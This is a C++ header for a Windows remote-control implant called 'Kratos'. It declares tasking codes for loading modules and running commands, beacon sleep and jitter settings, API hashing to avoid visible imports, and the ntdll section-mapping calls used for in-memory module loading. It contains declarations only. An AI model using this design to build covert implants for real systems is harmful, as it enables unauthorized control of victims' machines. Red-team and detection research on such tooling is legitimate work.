#pragma once
#include <windows.h>

#ifdef DEBUG
#include <stdio.h>
#include <wchar.h>
#endif

#include "nt.h"
#include "api/api.h"
#include "utils/utils.h"


#ifdef DEBUG
#define DEBUG_LOG(msg, ...)  printf(msg "\n", ##__VA_ARGS__)
#define DEBUG_LOGW(msg, ...)  wprintf(msg L"\n", ##__VA_ARGS__)
#else
#define DEBUG_LOG(msg, ...)  
#define DEBUG_LOGW(msg, ...) 
#endif


#define TO_DWORD(x) ((DWORD)(ULONG_PTR)(x))
#define ALLOC_ARGS LMEM_FIXED | LMEM_ZEROINIT

// Post message headers
#define MSG_GETTASK  0x1
#define MSG_REGISTER 0x2
#define MSG_OUTPUT   0x3

// Post response 
#define RESP_NO_TASKS 0xa1



// Task IDs
#define TASK_LOAD_MODULE   0xb1
#define TASK_LIST_MODULES  0xb2
#define TASK_RUN_CMD       0xb3
#define TASK_UNLOAD_MODULE 0xb4
#define TASK_EXIT_AGENT    0xb5

// Output IDs
#define OUTPUT_NO_PARSE    0xc1
#define OUTPUT_NEEDS_PARSE 0xc2
#define OUTPUT_SUCCESS     0xc3
#define OUTPUT_ERROR       0xc4

// Parser IDs carried by OUTPUT_NEEDS_PARSE
#define PARSE_MODULE_BITS 101

// Error Ids
#define ERROR_MODULE_LOADED         10
#define ERROR_MODULE_LOAD_FAILURE   11
#define ERROR_MODULE_NOT_LOADED     12
#define ERROR_MODULE_UNLOAD_FAILURE 13


// Success IDs
#define TASK_SUCCESS_NO_OUTPUT 0xf3
#define SUCCESS_MODULE_LOAD 0xb1
#define SUCCESS_MODULE_UNLOAD 0xb5


#define DECL( x ) decltype( x ) * x

#define HASH_STRA( x ) api::HasherA( ( x ) )
#define HASH_STRW( x ) api::HasherW( ( x ) )

class Kratos {
private:
	void moduleLoad( );
	void moduleUnload( );
	void moduleList( );
	void runModuleCmd( );
	void exitAgent( );
	void Cleanup( );

public:
	struct Apis {

		// advapi
		DECL(GetUserNameW);
		DECL(GetComputerNameExW);


		// k32
		DECL(LoadLibraryA);
		DECL(GetProcAddress);
		DECL(CloseHandle);
		DECL(LocalReAlloc);
		DECL(LocalAlloc);
		DECL(LocalFree);
		DECL(GetUserDefaultGeoName);
		DECL(GetTickCount);
		DECL(CreateFileA);
		DECL(MultiByteToWideChar);


		// ntdll
		DECL(RtlRandomEx);
		DECL(RtlExitUserProcess);
		DECL(RtlExitUserThread);
		DECL(NtOpenProcessToken);
		DECL(NtQueryInformationToken);
		DECL(NtQueryInformationProcess);
		DECL(NtCreateSection);
		DECL(NtMapViewOfSection);
		DECL(NtUnmapViewOfSection);
		DECL(NtProtectVirtualMemory);
		DECL(NtFlushInstructionCache);
	};

	struct Dlls {
		HMODULE kernel32;
		HMODULE ntdll;
		HMODULE Advapi32;
	};

	struct Settings {
		INT32 Sleep;
		INT32 Jitter;
		BOOL IsConnected;
		INT64 LoadedModules;
	};

	Settings settings;
	Apis   apis;
	Dlls dlls;
	INT32 AgentID;
	BOOL Register();
	BOOL Init();
	BOOL LoadApis();
	BOOL Run();

	BOOL Dispatch( INT32 TotalTasks );
};

extern Kratos* kratos;